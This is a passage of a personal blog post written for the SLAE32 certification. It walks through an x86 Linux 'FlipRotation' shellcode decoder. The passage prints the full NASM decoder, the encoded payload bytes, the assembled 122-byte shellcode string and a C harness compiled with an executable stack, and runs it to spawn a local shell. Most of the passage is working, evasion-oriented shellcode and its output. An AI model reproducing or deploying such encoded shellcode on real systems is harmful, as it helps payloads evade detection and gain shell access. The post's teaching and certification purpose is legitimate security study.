+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rol</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bitFlip:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x01</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>restore_next_byte:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">bl</span>	<span style="color:#75715e">; replaces the original byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#75715e">; mov next shellbyte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">edi</span>], <span style="color:#66d9ef">bl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">edi</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">dl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">cl</span> <span style="color:#75715e">; = 0x2b  F - 00101011
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x08</span>	<span style="color:#75715e">; if equal ZF will be set meaning we have a complete rotation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">decode</span>	<span style="color:#75715e">; $+2 ; jump if rotation is not complete
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>	<span style="color:#75715e">; if rotation is complete reset, cl to start again the &#34;circular array&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">decode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>call_decoder:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">decoder</span>
+</span></span><span style="display:flex;"><span>	EncodedShellcode: <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xe</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0xa0</span> 	<span style="color:#75715e">; 0xa0 is the stop marker
+</span></span></span></code></pre></div><h5 id="divide-and-conquer-the-fliprotation-decoder">Divide and Conquer the FlipRotation Decoder<a hidden class="anchor" aria-hidden="true" href="#divide-and-conquer-the-fliprotation-decoder">#</a></h5>
+<p>This decoder use the <code>jmp-call-pop</code> technique to push the address of the encoded shellcode on the stack and redirect control flow to <code>decoder</code> branch. Then, the address is stored in <code>esi</code></p>
+<p>We use <code>eax</code> to keep track the each parity byte and <code>edx</code> to control the offset from the beginning of the shellcode.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>decoder:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">1</span>]	<span style="color:#75715e">; pointing to second byte (0x02) from shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>        <span style="color:#75715e">; keep track parity byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cdq</span>					<span style="color:#75715e">; zeroes edx. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,	<span style="color:#ae81ff">1</span>           <span style="color:#75715e">; first parity byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>        <span style="color:#75715e">; loop index and number of rotation bits
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
+</span></span></code></pre></div><p>After this, we have our <code>decoder</code> branch which has the logic to decode the encoded shellcode. It start by moving the parity byte and checking with <code>xor bl, 0xa0</code> if matches the end marker. If yes, it means the shellcode is alrady decoded and redirects execution flow to its first instruction.</p>
+<p>The result of this <code>xor</code> operation using the parity byte will be used below with the operation <code>xor bl, 0x5f</code> to verify if associated shellcode byte is odd or even.</p>
+<p>We know because if we have a even shellcode byte, its parity is <code>0xff</code> and results in <code>0xa0 ^ 0xff = 0x5f</code> which si stored in <code>bl</code>. Then doing <code>xor bl, 0x5f</code> will set <code>ZF</code> (zero flag) to 1. Based on the zero flag value, we know if the shellcode byte is even or odd.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>decode:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>]	<span style="color:#75715e">; mov parity byte to bl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0xa0</span>				<span style="color:#75715e">; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">EncodedShellcode</span>	<span style="color:#75715e">; reached the marker if Zero Flag not set
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x5f</span>	<span style="color:#75715e">; if equal, parity is even (0xff) and sets ZF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>] 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">jnz</span> <span style="color:#66d9ef">odd</span>
+</span></span></code></pre></div><p>The next couple of isntruction are straighforward. We just to rotate in the oposite way that was performed by the encoder according to the byte parity and bit flipping the least significant bit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>even:	<span style="color:#75715e">; rotate right
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">ror</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">bitFlip</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>odd: 	<span style="color:#75715e">; rotate left
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rol</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bitFlip:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x01</span>
+</span></span></code></pre></div><p>At this stage, the tricky is already done. We just to replace the encoded shellcode byte for the original one using <code>edx</code> as offset. Then, we move to <code>bl</code> the next encoded byte.</p>
+<p>We cant forget to remove the last used parity byte from the encoded shellcode. In the <code>decode</code> branch we set up <code>edi</code> to point the address of the first parity byte. To remove this byte, we can make the next encoded shellcode byte to take its place. In practical terms, we copy the next encoded byte to the address of the last parity byte with the instruction <code>mov byte [edi], bl</code></p>
+<p>Then, we prepare he next iteration by:</p>
+<ul>
+<li>pointing <code>edi</code> to the position of next parity byte</li>
+<li><code>al</code> poiting to the next parity byte offset</li>
+<li><code>dl</code> poiting to the next encoded byte</li>
+<li>incrementing <code>cl</code> which is used as the loop index value</li>
+</ul>
+<p>The last part, we check if we reach the end of the <code>circular array</code>. As we are rotating 8 bits, we can&rsquo;t rotate no more than that. this way we aresynchronized with the encoder implementation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>restore_next_byte:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">bl</span>		<span style="color:#75715e">; replaces the original byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">1</span>] 	<span style="color:#75715e">; mov next encoded byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">edi</span>], <span style="color:#66d9ef">bl</span>				<span style="color:#75715e">; change last used parity byte for the next encoded byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">edi</span>							<span style="color:#75715e">; edi points to position of the next parity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">2</span>						<span style="color:#75715e">; offset added to next parity byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">dl</span>							<span style="color:#75715e">; offset to the next encoded byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">cl</span> 							<span style="color:#75715e">; loop index value incremented
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x08</span>	<span style="color:#75715e">; if equal ZF will be set meaning we have a complete rotation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">decode</span>		<span style="color:#75715e">; jump if rotation is not complete
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>	<span style="color:#75715e">; if rotation is complete, reset cl to start again the &#34;circular array&#34;
+</span></span></span></code></pre></div><h3 id="compiling-and-testing-the-fliprotation-decoder">Compiling and Testing the FlipRotation Decoder<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-fliprotation-decoder">#</a></h3>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh egg_hunter.nasm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">122</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x3f\x5e\x8d\x7e\x01\x31\xc0\x99\xb0\x01\x31\xc9\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x2f\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd2\x31\xc9\xeb\xce\xe8\xbc\xff\xff\xff\x30\x02\x83\xff\x45\xff\x4b\xff\xe2\x02\x71\x02\xc9\x02\xb4\xff\x69\xff\x17\x02\x8d\xff\x0d\x02\xf6\xff\x44\x02\x8b\x02\xa8\xff\x88\x02\xc7\xff\x94\x02\x11\x02\x0e\x02\x36\xff\x28\x02\x99\x02\x81\xff\xa0\xa0&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x3f\x5e\x8d\x7e\x01\x31\xc0\x99\xb0\x01\x31\xc9\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x2f\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd2\x31\xc9\xeb\xce\xe8\xbc\xff\xff\xff\x30\x02\x83\xff\x45\xff\x4b\xff\xe2\x02\x71\x02\xc9\x02\xb4\xff\x69\xff\x17\x02\x8d\xff\x0d\x02\xf6\xff\x44\x02\x8b\x02\xa8\xff\x88\x02\xc7\xff\x94\x02\x11\x02\x0e\x02\x36\xff\x28\x02\x99\x02\x81\xff\xa0\xa0</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode                                                        
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">122</span>
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>core  flipRotation_Encoder.py  flipRotation_decoder  flipRotation_decoder.nasm  flipRotation_decoder.o  shellcode  shellcode.c
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>We get a shell!!!</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xnibbles.github.io/posts/slae_32_assignment_3/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE32 Assignment 3 - Egghunter Shellcode</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) on twitter"
+        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_4%2f&amp;hashtags=slae32">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_4%2f&amp;title=SLAE32%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;summary=SLAE32%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_4%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
